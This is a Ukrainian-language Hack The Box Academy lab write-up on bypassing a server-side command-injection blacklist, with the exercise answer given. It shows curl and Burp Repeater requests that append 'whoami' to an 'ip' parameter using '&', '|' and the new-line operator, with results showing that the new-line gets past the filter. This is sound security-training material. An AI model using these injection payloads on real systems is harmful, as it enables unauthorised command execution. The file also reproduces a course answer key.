## Command Injections — Identifying Filters: Blacklisted Operators

**Модуль:** [Command Injections](https://academy.hackthebox.com/app/module/109)
**Секція:** [Identifying Filters](https://academy.hackthebox.com/app/module/109/section/1035)
**Відповідь:** `\n` (new-line)

***

## Концепція

**Server-side blacklist** — сервер перевіряє вхідні дані і блокує певні символи/оператори. На відміну від client-side (HTML `pattern`), це реальний захист. Але blacklist майже завжди **неповний** — розробники блокують очевидні символи (`;`, `&`, `|`) і забувають про менш відомі.

**New-line (`%0a`)** часто не потрапляє до blacklist бо:
- Використовується в легітимних даних (текстові поля)
- Розробники не думають про нього як injection operator
- Regex типу `/[;&|]/` його не ловить  [0xss0rz.gitbook](https://0xss0rz.gitbook.io/0xss0rz/pentest/web-attacks/command-injection)

***

## Як перевірити (три команди)

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://154.57.164.74:32673"

# & — %26
curl -s -X POST "$TARGET/index.php" \
  --data "ip=127.0.0.1%26whoami" | grep -E "Invalid|www-data|ping"

# | — %7c
curl -s -X POST "$TARGET/index.php" \
  --data "ip=127.0.0.1%7cwhoami" | grep -E "Invalid|www-data|ping"

# \n — %0a  ← не в blacklist
curl -s -X POST "$TARGET/index.php" \
  --data "ip=127.0.0.1%0awhoami" | grep -E "Invalid|www-data|ping"
```

**Результати:**

| Оператор | URL-код | Відповідь сервера |
|---|---|---|
| `&` | `%26` | `Invalid input` ❌ заблокований |
| `\|` | `%7c` | `Invalid input` ❌ заблокований |
| `\n` | `%0a` | `www-data` ✅ **не заблокований** |

***

## Через Burp Suite Repeater (альтернатива)

1. **Proxy → Intercept ON** → відправляємо будь-який IP у формі
2. **Intercept → Send to Repeater** (Ctrl+R)
3. У Repeater змінюємо `body`:
```
ip=127.0.0.1%26whoami   → Send → "Invalid input"
ip=127.0.0.1%7cwhoami   → Send → "Invalid input"
ip=127.0.0.1%0awhoami   → Send → ping output + "www-data" ✅
```

> Burp Repeater зручний бо дозволяє швидко тестувати варіанти без написання curl команд — просто редагуємо тіло запиту і натискаємо Send.

***

## Відповідь

```
\n
```
